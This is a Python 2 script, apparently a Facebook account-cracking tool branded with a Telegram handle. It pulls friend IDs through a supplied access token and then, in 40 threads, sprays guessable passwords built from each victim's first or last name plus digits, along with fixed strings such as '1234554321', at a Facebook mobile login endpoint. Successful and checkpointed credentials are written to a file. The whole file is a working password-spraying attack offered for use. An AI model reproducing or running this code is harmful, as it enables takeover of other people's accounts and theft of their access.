import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.headhead = {
    'accept':'*/*',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8',
    'content-length':'270',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'ig_cb=1; ig_did=BF4465A9-017D-4668-B5C3-EBD3DA65B2A6; csrftoken=b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC; rur=ASH; mid=XzHZAQALAAEagshAZoRCgkUeXmJP',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
    'x-csrftoken':'b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC',
    'x-ig-app-id':'936619743392459',
    'x-ig-www-claim':'0',
    'x-instagram-ajax':'a9aec8fa634f',
    'x-requested-with':'XMLHttpRequest'}
br.headhead = [('User-Agent', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36')]
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def hopss(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)

banner = """
\033[1;97m    |     ____      |                '||    ||'     |     '||''|.    ..|'''.|  
\033[1;97m   |||    `  ||    |||      ....      |||  |||     |||     ||   ||  .|'     '  
\033[1;97m  |  ||      /,   |  ||   .|...||     |'|..'||    |  ||    ||''|'   ||    .... 
\033[1;97m .''''|.    //   .''''|.  ||          | '|' ||   .''''|.   ||   |.  '|.    ||  
\033[1;97m.|.  .||.  ((   .|.  .||.  '|...'    .|. | .||. .|.  .||. .||.  '|'  ''|...'|  
\033[1;97m           ||                                                                  
\033[1;97m           |' 

\033[1;97mMy Telegram : \033[1;97m@A7Ae_MARG

\033[1;97mMy Chanell : \033[1;97m@A7AeMARG
    """                  
back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
			
#Menu
def menu():
    os.system('clear')
    print banner
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    print "[1] START CRACK FACEBOOK"
    print "[2] update Tool" 
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~' 
    menu_action()
    
    
def menu_action():
    act = raw_input('Choose Option : ')
    if act =="":
        print "Wrong Input"
        time.sleep(1)
        menu()
    elif act =="1":
        crack()
    elif act =="2":
        os.system('clear')
        print banner
        print
        hamza('Please Wait.')
        os.system('git pull origin master')
        hamza('Tool Has Updated')
        time.sleep(2)
        menu()
def crack():
    os.system('clear')
    print banner
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    print "[1] Crack From Friendlist"
    print "[2] Crack From Public ID"
    print "[3] Crack From File"
    print "[0] Back"
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    crack_menu()
    

def crack_menu():
	crm = raw_input("Choose Option : ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		print banner
		print
		token = raw_input('Paste Token Here : ')
		time.sleep(2)
		os.system('clear')
		print banner
		print
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		print banner
		print
		token = raw_input('Paste Token Here : ')
		time.sleep(2)
		os.system('clear')
		print banner
		print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~' 
		idt = raw_input("[+] Input ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
			hamza('\033[1;97m[ ] Account Name \033[1;97m:\033[1;97m '+op['name'])
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("\nPress Enter To Back  ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif crm =="3":
	    os.system('clear')
	    print banner
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         crack()
	   
	        
	        
	elif crm =="0":
		menu()
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        hamza('[ ] Total Friends: '+str(len(id)))
        time.sleep(0.5)
	hamza('[ ] The Process Has Been Started.')
	time.sleep(0.5)
        hamza('[ ] To Stop Process Press CTRL Then Z')
        time.sleep(0.5)
        print
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+token)
			b = json.loads(a.text)
			pass1= b['first_name'] + '12'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = '1234554321'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = '1122334455'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(user+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(user+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1122'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
															crt = open("save/checkpoint.txt", "a")
															crt.write(user+"|"+pass6+"\n")
															crt.close()
															checkpoint.append(user+pass6)
														else:
															pass7 = b['last_name'] + '12345'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;92m|\x1b[1;32m ' + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
																	crt = open("save/checkpoint.txt", "a")
																	crt.write(user+"|"+pass7+"\n")
																	crt.close()
																	checkpoint.append(user+pass7)           					
								                                       
				                                                                           
	
																	
															
		except:
			pass
		
	p = ThreadPool(40)
	p.map(main, id)
	print "\033[1;97m---------------------A7Ae MARG-----------------------"
	hamza('[ ] Process Has Been Completed.')
	hamza('\033[1;97m[ ] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[ ] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	menu()	
	
	

if __name__ == '__main__':
	menu()
